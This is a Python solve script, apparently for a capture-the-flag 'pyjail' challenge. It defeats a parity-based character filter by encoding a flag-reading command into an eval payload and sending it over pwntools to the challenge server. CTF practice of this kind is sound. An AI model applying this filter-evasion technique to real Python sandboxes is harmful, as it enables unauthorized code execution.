#!/usr/bin/env python3
import string
import sys

from pwn import remote

# For reference:
# Characters with even parity: " <space>
# Characters with odd parity:  ' + <tab>


def highlight(s):
    ''' Highlights any parity errors in the given string in red '''

    result = ''
    for i, v in enumerate(s):
        if not (ord(v) < 128 and i % 2 == ord(v) % 2):
            v = '#' if v in string.whitespace else v
            result += f'\033[91m{v}\033[0m'
        else:
            result += f'\033[92m{v}\033[0m'
    return result


def encode(s):
    '''
    Converts a string into an eval-able representation while maintaining
    alternating parity between characters:

    Input:  'abc'
    Output: '\t\t"a"\t + \'b\' + \t"c"'
    '''

    groups = []

    for v in s:
        # surround each character with the appropriate quote character having opposite parity
        quote = '"' if ord(v) % 2 else "'"
        groups.append(quote + v + quote)

    result = ' ' if ord(groups[0][0]) % 2 else '\t'

    for g in groups:
        # fix parity for upcoming quote
        if len(result) % 2 != ord(g[0]) % 2:
            result += '\t' if len(result) % 2 else ' '
        result += g

        # fix parity for upcoming plus
        if len(result) % 2 != ord(' ') % 2:
            result += '\t' if len(result) % 2 else ' '
        result += ' + '

    return result.rstrip('+\t ')


def main():

    # other payloads may require slightly different padding to fix parity
    cmd = 'print(open("flag.txt").read())'
    payload = encode(cmd)
    payload = f' eval\t(\t{payload})'

    print(payload)
    print(highlight(payload), file=sys.stderr)

    r = remote('challs2.pyjail.club', 7991)
    r.recvuntil(b'> ')
    r.sendline(payload.encode())
    print(r.recv().decode())


if __name__ == "__main__":
    main()
